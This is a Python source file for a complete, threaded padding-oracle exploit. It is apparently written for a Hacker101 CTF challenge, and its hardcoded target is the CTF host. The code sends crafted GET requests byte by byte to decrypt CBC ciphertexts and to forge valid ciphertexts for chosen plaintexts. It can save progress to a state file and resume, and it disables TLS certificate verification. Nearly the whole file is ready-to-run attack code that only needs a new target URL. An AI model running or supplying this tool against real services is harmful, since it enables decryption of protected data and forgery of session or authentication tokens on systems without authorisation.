#!/usr/bin/env python3
"""
Local padding-oracle demo (GET + custom base64 alphabet) with CLI payload parameter.

- Threaded requests with worker pool
- Progress display per recovered byte (hex + char)
- Optional state file for resuming recovery
- Client: Uses urllib (honors env proxies) to call oracle and runs padding-oracle recovery
- Supports encryption via padding oracle (builds ciphertext backwards; multi-block fixed)
- Usage:
    python3 padding-oracle-exploit.py --decrypt "<payload>"
    python3 padding-oracle-exploit.py --encrypt "plaintext string"
"""
import argparse
import base64
import ssl
import json
import os
import string
from urllib import request, parse
from concurrent.futures import ThreadPoolExecutor, as_completed

# -------------------------
# PKCS#7 helpers
# -------------------------
BLOCK_SIZE = 16

def pad(data, block_size=BLOCK_SIZE):
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len

def unpad(data):
    if len(data) == 0:
        raise ValueError("Invalid padding")
    pad_len = data[-1]
    if pad_len < 1 or pad_len > BLOCK_SIZE:
        raise ValueError("Invalid padding")
    if data[-pad_len:] != bytes([pad_len]) * pad_len:
        raise ValueError("Invalid padding")
    return data[:-pad_len]

# -------------------------
# Custom base64 alphabet helpers
# -------------------------
def to_custom_b64(raw_bytes):
    std = base64.b64encode(raw_bytes).decode('ascii')
    return std.replace('+', '-').replace('/', '!').replace('=', '~')

def from_custom_b64(s):
    std = s.replace('-', '+').replace('!', '/').replace('~', '=')
    return base64.b64decode(std, validate=True)

# -------------------------
# Client setup
# -------------------------
ORACLE_BASE = "https://9df3a12aa6affafb8c189aaf80648187.ctf.hacker101.com/"

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

https_handler = request.HTTPSHandler(context=ssl_ctx)
proxy_handler = request.ProxyHandler()
opener = request.build_opener(proxy_handler, https_handler)

# -------------------------
# Thread-safe print helper
# -------------------------
def safe_print(*args, **kwargs):
    print(*args, **kwargs, flush=True)

# -------------------------
# Padding oracle request
# -------------------------
def padding_oracle_http_get(payload_bytes, max_retries=3):
    """
    Sends GET request to the oracle with the custom-base64 payload.

    - Retries when the HTTP response status is not 200 (up to max_retries).
    - If a 200 response is received, returns (True, attempts) when body does NOT contain "PaddingException".
      Returns (False, attempts) when the body contains "PaddingException" (valid oracle negative).
    - On network/proxy exceptions the function will retry; after max_retries it raises RuntimeError.
    - If the server returns non-200 for all attempts, raises RuntimeError.
    """
    custom_b64 = to_custom_b64(payload_bytes)
    q = parse.urlencode({'post': custom_b64})
    url = ORACLE_BASE + "?" + q
    req = request.Request(url, method="GET")

    for attempt in range(1, max_retries + 1):
        try:
            with opener.open(req, timeout=5) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                # If server returned 200, evaluate padding outcome and return
                if resp.status == 200:
                    if "PaddingException" not in body:
                        return True, attempt
                    return False, attempt
                # If non-200, retry unless we've exhausted attempts
                if attempt == max_retries:
                    raise RuntimeError(f"Server returned status {resp.status} after {attempt} attempts. Aborting.")
                # else: continue loop and retry
        except Exception as e:
            # network or other exception: retry up to max_retries, then abort
            if attempt == max_retries:
                raise RuntimeError(f"Network/Proxy error after {attempt} attempts: {e}")
            # otherwise loop to retry
    # Shouldn't reach here
    raise RuntimeError("Unexpected error in padding_oracle_http_get")

# -------------------------
# State helpers
# -------------------------
def load_state(filename):
    if not os.path.exists(filename):
        return {}
    with open(filename, "r") as f:
        data = json.load(f)

    out = {}
    for k, v in data.items():
        block_num = int(k)
        if isinstance(v, str):
            try:
                raw = bytes.fromhex(v)
                out[block_num] = [b for b in raw]
            except Exception:
                out[block_num] = [None] * BLOCK_SIZE
        elif isinstance(v, list):
            arr = []
            for i in range(BLOCK_SIZE):
                if i < len(v):
                    item = v[i]
                    arr.append(int(item) & 0xff if item is not None else None)
                else:
                    arr.append(None)
            out[block_num] = arr
        else:
            out[block_num] = [None] * BLOCK_SIZE
    return out

def save_state(filename, state):
    serializable = {}
    for k, v in state.items():
        arr = [(int(item) & 0xff if item is not None else None) for item in (v + [None]*BLOCK_SIZE)[:BLOCK_SIZE]]
        serializable[str(k)] = arr
    with open(filename, "w") as f:
        json.dump(serializable, f)

# -------------------------
# Recover one block (threaded) - returns (recovered_plaintext_bytes, crafted_previous_block_bytes)
# -------------------------
def recover_block_via_oracle_get(target_block, previous_block, block_num, total_blocks,
                                 max_retries, state_file=None, recovered_so_far=None,
                                 max_workers=8):
    """
    Returns:
      - recovered_plaintext_bytes: recovered plaintext for the given target_block when paired with previous_block
        (i.e. recovered_plain = D(target_block) XOR previous_block)
      - crafted_previous_block_bytes: the mod_prev that was used to find valid padding on final successful guess.
    """
    intermediate = bytearray(BLOCK_SIZE)
    recovered = [None] * BLOCK_SIZE
    crafted_prev = None

    if recovered_so_far and block_num in recovered_so_far:
        saved = recovered_so_far[block_num]
        for i in range(BLOCK_SIZE):
            if saved[i] is not None:
                recovered[i] = int(saved[i]) & 0xff
                intermediate[i] = recovered[i] ^ previous_block[i]

    def printable_char(b):
        try:
            c = chr(b)
            return c if c in string.printable and not c.isspace() else "."
        except Exception:
            return "."

    for byte_index in range(1, BLOCK_SIZE + 1):
        pad_value = byte_index
        if recovered[-byte_index] is not None:
            safe_print(f"[progress] Block {block_num}/{total_blocks} Byte {byte_index}/{BLOCK_SIZE} "
                       f"(from state) -> 0x{recovered[-byte_index]:02x} ('{printable_char(recovered[-byte_index])}')")
            continue

        found = False
        requests_count = 0
        retries = 0

        def try_guess(guess):
            mod_prev = bytearray(previous_block)
            for i in range(1, byte_index):
                mod_prev[-i] = intermediate[-i] ^ pad_value
            mod_prev[-byte_index] = guess
            ok, attempts = padding_oracle_http_get(bytes(mod_prev) + bytes(target_block),
                                                   max_retries=max_retries)
            return guess, ok, attempts, bytes(mod_prev)

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(try_guess, g) for g in range(256)]
            for future in as_completed(futures):
                guess, ok, attempts, mod_prev_bytes = future.result()
                requests_count += 1
                retries += attempts - 1
                if ok:
                    intermediate[-byte_index] = guess ^ pad_value
                    recovered[-byte_index] = intermediate[-byte_index] ^ previous_block[-byte_index]
                    crafted_prev = mod_prev_bytes
                    found = True
                    safe_print(f"[progress] Block {block_num}/{total_blocks} Byte {byte_index}/{BLOCK_SIZE} "
                               f"Requests: {requests_count} Retries: {retries} "
                               f"-> Recovered: 0x{recovered[-byte_index]:02x} ('{printable_char(recovered[-byte_index])}')")
                    for f in futures:
                        f.cancel()
                    break

        if not found:
            raise RuntimeError("Failed to find a valid padding byte — oracle may be unreachable or behavior differs")

        if state_file and recovered_so_far is not None:
            if block_num not in recovered_so_far:
                recovered_so_far[block_num] = [None] * BLOCK_SIZE
            recovered_so_far[block_num][-byte_index] = recovered[-byte_index]
            save_state(state_file, recovered_so_far)

    if crafted_prev is None:
        crafted_prev = bytes(previous_block)
    return bytes([b if b is not None else 0 for b in recovered]), crafted_prev

# -------------------------
# Recover all blocks (decryption)
# -------------------------
def recover_all_blocks_get(payload_bytes, max_retries=3, state_file=None, max_workers=8):
    if len(payload_bytes) < 32 or (len(payload_bytes) % BLOCK_SIZE) != 0:
        raise ValueError("payload must be IV + at least one ciphertext block, block-aligned")

    blocks = [payload_bytes[i:i+BLOCK_SIZE] for i in range(0, len(payload_bytes), BLOCK_SIZE)]
    recovered_all = b""
    total_blocks = len(blocks) - 1

    recovered_so_far = load_state(state_file) if state_file else {}

    for i in range(1, len(blocks)):
        recovered_block, _ = recover_block_via_oracle_get(
            blocks[i], blocks[i-1],
            i, total_blocks,
            max_retries,
            state_file=state_file,
            recovered_so_far=recovered_so_far,
            max_workers=max_workers
        )
        recovered_all += recovered_block

    return unpad(recovered_all)

# -------------------------
# Encryption via padding oracle (fixed: build blocks backwards)
# -------------------------
def encrypt_all_blocks(plaintext_bytes, max_retries=3, max_workers=8):
    """
    Encrypt plaintext via padding oracle by building ciphertext backwards.
    Produces C0||C1||...||Cn such that decrypt(C) = padded plaintext.

    Algorithm:
      - pad plaintext and split into P[1..n]
      - choose random C[n]
      - for i = n .. 1:
          * recover D(C[i]) via oracle (send previous_block = zero_block)
          * set C[i-1] = D(C[i]) XOR P[i]
      - result is C[0] || C[1] || ... || C[n]
    """
    padded = pad(plaintext_bytes)
    plain_blocks = [padded[i:i+BLOCK_SIZE] for i in range(0, len(padded), BLOCK_SIZE)]
    n = len(plain_blocks)

    # we'll store C0..Cn (C0 is IV)
    cipher_blocks = [None] * (n + 1)

    # pick a random tail block C[n]
    next_cipher = os.urandom(BLOCK_SIZE)
    cipher_blocks[n] = next_cipher

    zero_block = bytes([0] * BLOCK_SIZE)

    for i in range(n, 0, -1):
        safe_print(f"[encrypt] Recovering intermediate D(C_{i}) for plaintext block {i}/{n}...")
        # recover D(C[i]) by using previous_block = zero_block
        recovered_plain, _ = recover_block_via_oracle_get(
            target_block=next_cipher,
            previous_block=zero_block,
            block_num=i,
            total_blocks=n,
            max_retries=max_retries,
            recovered_so_far=None,
            max_workers=max_workers
        )
        intermediate = recovered_plain  # D(C[i])
        p_block = plain_blocks[i-1]
        c_prev = bytes([intermediate[j] ^ p_block[j] for j in range(BLOCK_SIZE)])
        cipher_blocks[i-1] = c_prev
        # next iteration uses this c_prev as C[i]
        next_cipher = c_prev

    final = b"".join(cipher_blocks)
    return final

# -------------------------
# CLI
# -------------------------
def parse_args():
    parser = argparse.ArgumentParser(
        description="Threaded padding-oracle GET recovery and encryption with custom base64 and state file."
    )
    parser.add_argument("--decrypt",
                        help="Payload in custom base64 alphabet (+->-, /->!, =->~) for decryption.")
    parser.add_argument("--encrypt", type=str,
                        help="Plaintext string to encrypt via padding oracle.")
    parser.add_argument("--retries", type=int, default=3, help="Retries per failed request.")
    parser.add_argument("--state", type=str, help="Optional state file to save/recover progress.")
    parser.add_argument("--workers", type=int, default=8, help="Number of concurrent worker threads.")
    return parser.parse_args()

def main_demo():
    args = parse_args()

    if args.encrypt:
        plaintext_bytes = args.encrypt.encode("utf-8")
        safe_print("[client] Encrypting plaintext via oracle...")
        try:
            ciphertext_bytes = encrypt_all_blocks(plaintext_bytes,
                                                  max_retries=args.retries,
                                                  max_workers=args.workers)
            safe_print("[client] Ciphertext (custom-base64):", to_custom_b64(ciphertext_bytes))
        except Exception as e:
            safe_print("[client] Error during encryption:", e)
        return

    if not args.decrypt:
        safe_print("[client] Please provide either --decrypt for decryption or --encrypt for encryption.")
        return

    # -------------------------
    # Decryption path
    # -------------------------
    try:
        payload_bytes = from_custom_b64(args.decrypt)
    except Exception as e:
        safe_print("[client] Failed to decode provided payload. Error:", e)
        return

    if len(payload_bytes) < 32 or (len(payload_bytes) % BLOCK_SIZE) != 0:
        safe_print("[client] Provided payload is malformed (must be IV + ciphertext, block-aligned). Exiting.")
        return

    try:
        safe_print("[client] Oracle payload (custom-base64):", to_custom_b64(payload_bytes))
        safe_print("[client] Launching threaded padding-oracle recovery via GET...")
        recovered_plaintext = recover_all_blocks_get(payload_bytes,
                                                     max_retries=args.retries,
                                                     state_file=args.state,
                                                     max_workers=args.workers)
        safe_print("[client] Recovered plaintext:", recovered_plaintext)
    except Exception as e:
        safe_print("[client] Error during recovery:", e)

if __name__ == "__main__":
    main_demo()

